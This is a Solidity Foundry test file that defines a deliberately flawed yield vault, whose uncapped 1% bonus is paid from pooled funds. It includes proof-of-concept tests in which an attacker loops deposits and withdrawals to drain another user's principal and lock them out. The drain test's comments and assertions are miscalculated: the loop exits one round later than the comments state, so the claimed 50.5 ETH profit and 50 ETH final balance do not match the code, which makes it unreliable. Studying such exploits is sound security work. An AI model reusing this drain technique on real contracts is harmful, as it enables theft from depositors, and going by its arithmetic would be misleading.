pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract YieldVault {
    mapping(address => uint256) public principal;
    uint256 public totalPrincipal;

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount, uint256 bonus);

    constructor() payable {}

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        principal[msg.sender] += msg.value;
        totalPrincipal += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 p = principal[msg.sender];
        require(p > 0, "nothing to withdraw");
        principal[msg.sender] = 0;
        totalPrincipal -= p;
        uint256 bonus = p / 100;
        (bool ok, ) = msg.sender.call{value: p + bonus}("");
        require(ok, "transfer failed");
        emit Withdraw(msg.sender, p, bonus);
    }

    function totalAssets() external view returns (uint256) {
        return address(this).balance;
    }
}

/// The "loyalty bonus" is 1% of principal and is paid out of the contract
/// balance, never from the 1 ETH buffer alone, and nothing caps it. So a user
/// can loop deposit/withdraw, pocket 1% per round, drain the buffer AND the
/// principal of the other depositor, and walk away with the money.
contract YieldVaultDrainTest is Test {
    YieldVault vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint256 constant BUFFER = 1 ether;   // seeded reward buffer at deploy
    uint256 constant STAKE = 50 ether;   // attacker's per-cycle deposit
    uint256 constant VICTIM_DEP = 100 ether;

    function setUp() public {
        vault = new YieldVault{value: BUFFER}();
        vm.deal(attacker, 200 ether);
        vm.deal(victim, VICTIM_DEP);

        // An honest user deposits real money.
        vm.prank(victim);
        vault.deposit{value: VICTIM_DEP}();

        assertEq(address(vault).balance, BUFFER + VICTIM_DEP);
        assertEq(vault.totalPrincipal(), VICTIM_DEP);
    }

    /// Attacker loops until the vault can no longer cover a full cycle, then
    /// takes the last payout too. A 1 ETH buffer funds a 50.5 ETH steal.
    function testAttackerStealsVictimPrincipal() public {
        uint256 start = attacker.balance;

        // Vault balance is 101 - 0.5*cycles. Keep cycling while it can still
        // pay out 50 + 0.5. This stops when the balance lands on exactly 50.5.
        uint256 cycles;
        while (address(vault).balance >= STAKE + STAKE / 100) {
            vm.startPrank(attacker);
            vault.deposit{value: STAKE}();
            vault.withdraw();
            vm.stopPrank();
            cycles++;
        }

        // Final round: deposit 50 (balance 100.5) and take 50.5 back (50 left).
        vm.startPrank(attacker);
        vault.deposit{value: STAKE}();
        vault.withdraw();
        vm.stopPrank();

        uint256 profit = attacker.balance - start;
        emit log_named_uint("cycles", cycles);
        emit log_named_decimal_uint("attacker profit (ETH)", profit, 18);
        emit log_named_decimal_uint("vault balance (ETH)", address(vault).balance, 18);
        emit log_named_decimal_uint("still owed to victim (ETH)", vault.totalPrincipal(), 18);

        // Attacker started with 200 ETH and ends with 250.5 ETH: +50.5 ETH.
        assertEq(profit, 50.5 ether);
        // Vault holds only 50 ETH but still owes the victim 100 ETH.
        assertEq(address(vault).balance, 50 ether);
        assertEq(vault.totalPrincipal(), 100 ether);
        assertLt(address(vault).balance, vault.totalPrincipal());

        // The victim is locked out entirely: the 100 ETH payout reverts.
        vm.prank(victim);
        vm.expectRevert("transfer failed");
        vault.withdraw();
    }

    /// Minimal version: a single deposit/withdraw pair already pays more than
    /// the whole buffer, so solvency breaks on the very first withdrawal.
    function testSingleWithdrawBreaksSolvency() public {
        vm.startPrank(attacker);
        vault.deposit{value: 150 ether}();
        vault.withdraw();
        vm.stopPrank();

        // 101 + 150 - 151.5 = 99.5 held, while 100 is still owed.
        assertEq(address(vault).balance, 99.5 ether);
        assertLt(address(vault).balance, vault.totalPrincipal());
        assertEq(vault.totalAssets(), address(vault).balance);
    }
}

